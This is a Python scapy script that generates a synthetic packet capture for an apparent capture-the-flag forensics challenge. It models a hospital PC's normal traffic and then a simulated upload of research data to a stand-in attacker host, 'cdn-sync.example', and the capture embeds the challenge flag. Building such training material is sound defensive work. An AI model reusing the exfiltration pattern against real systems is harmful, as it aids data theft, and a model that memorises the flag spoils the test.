from scapy.all import IP, TCP, UDP, DNS, DNSQR, Raw, wrpcap
from datetime import datetime, timezone, timedelta

packets = []

HOSPITAL_PC = "10.10.20.45"
DNS_SERVER = "10.10.20.10"
WEB_SERVER = "10.10.20.20"
ATTACKER_IP = "185.199.110.153"

# Capture timeline: 9 October 2026, Sri Lanka time (UTC+5:30)
BASE_TIME = datetime(2026, 10, 9, 22, 40, 0, tzinfo=timezone(timedelta(hours=5, minutes=30))).timestamp()


def timestamp(packet, offset_seconds):
    packet.time = BASE_TIME + offset_seconds
    return packet


# ------------------------------------------------------------
# 1. Normal DNS activity
# ------------------------------------------------------------

dns_queries = [
    ("portal.hospital.local", 12),
    ("updates.hospital.local", 18),
    ("research.hospital.local", 25),
    ("ntp.hospital.local", 31),
]

for i, (domain, offset) in enumerate(dns_queries):
    packet = (
        IP(src=HOSPITAL_PC, dst=DNS_SERVER)
        / UDP(sport=40000 + i, dport=53)
        / DNS(rd=1, qd=DNSQR(qname=domain))
    )

    packets.append(timestamp(packet, offset))


# ------------------------------------------------------------
# 2. Normal hospital dashboard traffic
# ------------------------------------------------------------

http_request = (
    IP(src=HOSPITAL_PC, dst=WEB_SERVER)
    / TCP(sport=45000, dport=80, flags="PA", seq=1000, ack=1)
    / Raw(
        load=b"GET /hospital-dashboard HTTP/1.1\r\n"
             b"Host: portal.hospital.local\r\n\r\n"
    )
)

http_response = (
    IP(src=WEB_SERVER, dst=HOSPITAL_PC)
    / TCP(sport=80, dport=45000, flags="PA", seq=1, ack=1046)
    / Raw(
        load=b"HTTP/1.1 200 OK\r\n"
             b"Content-Length: 18\r\n\r\n"
             b"Hospital Dashboard"
    )
)

packets.append(timestamp(http_request, 63))
packets.append(timestamp(http_response, 64))


# ------------------------------------------------------------
# 3. Normal HTTPS-like hospital traffic
# ------------------------------------------------------------

for i in range(3):
    packet = (
        IP(src=HOSPITAL_PC, dst=WEB_SERVER)
        / TCP(
            sport=46000 + i,
            dport=443,
            flags="PA",
            seq=2000,
            ack=1
        )
        / Raw(load=b"TLS_APPLICATION_DATA_NORMAL_HOSPITAL_TRAFFIC")
    )

    packets.append(timestamp(packet, 120 + (i * 45)))


# ------------------------------------------------------------
# 4. Suspicious outbound connection
#    Begins shortly before the exfiltration event.
# ------------------------------------------------------------

CLIENT_PORT = 51515
SERVER_PORT = 443
CLIENT_SEQ = 10000
SERVER_SEQ = 50000

packets.append(
    timestamp(
        IP(src=HOSPITAL_PC, dst=ATTACKER_IP)
        / TCP(
            sport=CLIENT_PORT,
            dport=SERVER_PORT,
            flags="S",
            seq=CLIENT_SEQ
        ),
        430
    )
)

packets.append(
    timestamp(
        IP(src=ATTACKER_IP, dst=HOSPITAL_PC)
        / TCP(
            sport=SERVER_PORT,
            dport=CLIENT_PORT,
            flags="SA",
            seq=SERVER_SEQ,
            ack=CLIENT_SEQ + 1
        ),
        431
    )
)

packets.append(
    timestamp(
        IP(src=HOSPITAL_PC, dst=ATTACKER_IP)
        / TCP(
            sport=CLIENT_PORT,
            dport=SERVER_PORT,
            flags="A",
            seq=CLIENT_SEQ + 1,
            ack=SERVER_SEQ + 1
        ),
        432
    )
)


# ------------------------------------------------------------
# 5. Exfiltration HTTP request
# ------------------------------------------------------------

http_upload = (
    b"POST /upload HTTP/1.1\r\n"
    b"Host: cdn-sync.example\r\n"
    b"Content-Type: application/octet-stream\r\n"
    b"Content-Length: 133\r\n"
    b"\r\n"
)

packets.append(
    timestamp(
        IP(src=HOSPITAL_PC, dst=ATTACKER_IP)
        / TCP(
            sport=CLIENT_PORT,
            dport=SERVER_PORT,
            flags="PA",
            seq=CLIENT_SEQ + 1,
            ack=SERVER_SEQ + 1
        )
        / Raw(load=http_upload),
        433
    )
)

client_seq = CLIENT_SEQ + 1 + len(http_upload)


# ------------------------------------------------------------
# 6. Exfiltrated data
# ------------------------------------------------------------

exfiltration_data = (
    b"SESSION=RESEARCH-4421\n"
    b"HOST=LAB-PC-045\n"
    b"TIME=22:47:16\n"
    b"TRANSFER=research_export.enc\n"
    b"STATUS=CONFIRMED\n"
    b"FLAG=PULSE{exfiltration_confirmed}\n"
)

chunks = [
    exfiltration_data[:45],
    exfiltration_data[45:90],
    exfiltration_data[90:]
]

for index, chunk in enumerate(chunks):
    packets.append(
        timestamp(
            IP(src=HOSPITAL_PC, dst=ATTACKER_IP)
            / TCP(
                sport=CLIENT_PORT,
                dport=SERVER_PORT,
                flags="PA",
                seq=client_seq,
                ack=SERVER_SEQ + 1
            )
            / Raw(load=chunk),
            434 + index
        )
    )

    client_seq += len(chunk)


# ------------------------------------------------------------
# 7. Attacker acknowledges transfer
# ------------------------------------------------------------

packets.append(
    timestamp(
        IP(src=ATTACKER_IP, dst=HOSPITAL_PC)
        / TCP(
            sport=SERVER_PORT,
            dport=CLIENT_PORT,
            flags="PA",
            seq=SERVER_SEQ + 1,
            ack=client_seq
        )
        / Raw(load=b"HTTP/1.1 200 OK\r\n\r\nTransfer received"),
        438
    )
)


# ------------------------------------------------------------
# Write PCAP
# ------------------------------------------------------------

output = "PL-07/challenge/hospital_traffic.pcap"

wrpcap(output, packets)

print("[+] PL-07 PCAP generated successfully")
print(f"[+] Saved to: {output}")
print(f"[+] Total packets: {len(packets)}")
print(f"[+] Suspicious destination: {ATTACKER_IP}")
print(f"[+] Suspicious event: approximately 22:47:10-22:47:18")
